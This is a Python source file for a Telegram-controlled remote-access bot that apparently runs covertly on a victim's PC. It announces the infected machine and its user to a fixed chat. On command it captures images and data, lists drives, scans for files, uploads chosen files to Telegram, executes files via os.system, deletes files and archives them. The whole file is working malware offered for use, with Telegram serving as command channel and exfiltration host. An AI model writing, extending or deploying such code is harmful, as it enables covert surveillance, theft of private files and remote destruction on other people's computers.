import telebot

from config import *
from utils import *

bot_id = getID()
bot = telebot.TeleBot(config.finder_token, threaded=False)
pathFiles = []


@bot.message_handler(commands=['online'])
def command_online(message):
    image_with_data(bot, chat_id, bot_id)


@bot.message_handler(commands=['help'])
def command_help(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 1):
        return
    if equalsID(msgArray[1], bot_id):
        bot.send_message(message.chat.id, config.finder_help)


@bot.message_handler(commands=['image'])
def command_image(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 1):
        return
    if equalsID(msgArray[1], bot_id):
        image_with_data(bot, message.chat.id, bot_id)


@bot.message_handler(commands=['drives'])
def command_drives(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 1):
        return
    if equalsID(msgArray[1], bot_id):
        bot.send_message(message.chat.id, str(getAllDrives()))


@bot.message_handler(commands=['scan'])
def command_scan(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 3):
        return
    if equalsID(msgArray[1], bot_id):
        bot.send_message(message.chat.id, config.scan)
        searchFiles(bot, message.chat.id, msgArray[2], msgArray[3], pathFiles)
        bot.send_message(message.chat.id, config.success + f" {bot_id}")


@bot.message_handler(commands=['list'])
def command_list(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 3):
        return
    if equalsID(msgArray[1], bot_id):

        if not pathFiles:
            bot.send_message(message.chat.id, config.arrayIsEmpty)
            return

        text = str()
        index = int(msgArray[2])
        for item in pathFiles[int(msgArray[2]):int(msgArray[3])]:
            text += f"{os.path.basename(item)} : {index}\n"
            index += 1

        bot.send_message(message.chat.id, text)
        bot.send_message(message.chat.id, config.success + f" {bot_id}")


@bot.message_handler(commands=['nameload'])
def command_nameload(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 4):
        return
    if equalsID(msgArray[1], bot_id):

        if not pathFiles:
            searchFiles(bot, message.chat.id, msgArray[2], msgArray[3], pathFiles)

        searchFileName = msgArray[4].replace(space_symbol, ' ')

        for i in pathFiles:
            if str(i).endswith(searchFileName):
                with open(i, 'rb') as file:
                    bot.send_document(message.chat.id, file)
        bot.send_message(message.chat.id, config.success + f" {bot_id}")


@bot.message_handler(commands=['numload'])
def command_numload(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 2):
        return
    if equalsID(msgArray[1], bot_id):

        if not pathFiles:
            bot.send_message(message.chat.id, config.arrayIsEmpty)
            return

        if len(pathFiles) < int(msgArray[2]):
            bot.send_message(message.chat.id, config.indexOutOfBounds)
            return

        searchFileName = pathFiles[int(msgArray[2])]

        with open(searchFileName, 'rb') as file:
            bot.send_document(message.chat.id, file)
            bot.send_message(message.chat.id, config.success + f" {bot_id}")


@bot.message_handler(commands=['open'])
def command_open(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 2):
        return
    if equalsID(msgArray[1], bot_id):
        if not pathFiles:
            bot.send_message(message.chat.id, config.arrayIsEmpty)
            return

        if len(pathFiles) < int(msgArray[2]):
            bot.send_message(message.chat.id, config.indexOutOfBounds)
            return

        searchFileName = pathFiles[int(msgArray[2])]

        try:
            os.system(searchFileName)
            bot.send_message(message.chat.id, config.success + f" {bot_id}")
        except Exception as i:
            print(i)
            pass


@bot.message_handler(commands=['delete'])
def command_delete(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 2):
        return
    if equalsID(msgArray[1], bot_id):

        if not pathFiles:
            bot.send_message(message.chat.id, config.arrayIsEmpty)
            return

        if len(pathFiles) < int(msgArray[2]):
            bot.send_message(message.chat.id, config.indexOutOfBounds)
            return

        searchFileName = pathFiles[int(msgArray[2])]

        try:
            os.remove(searchFileName)
            bot.send_message(message.chat.id, config.success + f" {bot_id}")
        except Exception as i:
            print(i)
            pass


@bot.message_handler(commands=['archive'])
def command_archive(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 3):
        return
    if equalsID(msgArray[1], bot_id):

        if not pathFiles:
            searchFiles(bot, message.chat.id, msgArray[2], msgArray[3], pathFiles)
        archiveFiles(pathFiles)
    bot.send_message(message.chat.id, config.success + f" {bot_id}")


bot.send_message(chat_id, f'connect PC |{getUser()}| with ID: {bot_id}')

while True:
    try:
        bot.polling(none_stop=True, interval=0)
    except Exception as exception:
        print(str(exception))
